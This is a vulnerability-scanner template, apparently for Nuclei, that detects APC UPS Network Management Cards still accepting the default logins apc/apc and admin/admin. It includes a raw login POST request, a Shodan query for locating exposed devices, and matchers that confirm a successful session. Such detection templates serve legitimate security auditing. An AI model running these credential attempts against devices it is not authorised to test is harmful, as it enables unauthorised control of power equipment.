id: apc-nmc-default-login

info:
  name: Schneider Electric APC NMC Default Credentials
  author: x-stp
  severity: high
  description: Detects APC Network Management Cards with common default credentials.
  reference:
    - https://www.apc.com/us/en/faqs/FA156047/
  classification:
    cwe-id: CWE-522
    cvss-score: 8.6
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L
    cpe: cpe:2.3:o:schneider-electric:network_management_card_firmware:*:*:*:*:*:*:*:*
  metadata:
    max-request: 4
    shodan-query: title:"APC | Log On"
    product: apc network management card
    vendor: schneider-electric
  tags: apc,default-login,iot,ups

http:
  - raw:
      - |
        POST /Forms/login1 HTTP/1.1
        Host: {{Hostname}}
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        Accept: */*
        Accept-Language: en

        login_username={{username}}&login_password={{password}}&prefLanguage=00000000&submit=Log+On

    attack: pitchfork
    payloads:
      username:
        - apc
        - admin
      password:
        - apc
        - admin

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 303

      - type: regex
        part: header
        regex:
          - "(?i)Location: .*/NMC/"

      - type: regex
        part: header
        regex:
          - "(?i)Set-Cookie: APC[^=]+=[^;]+"
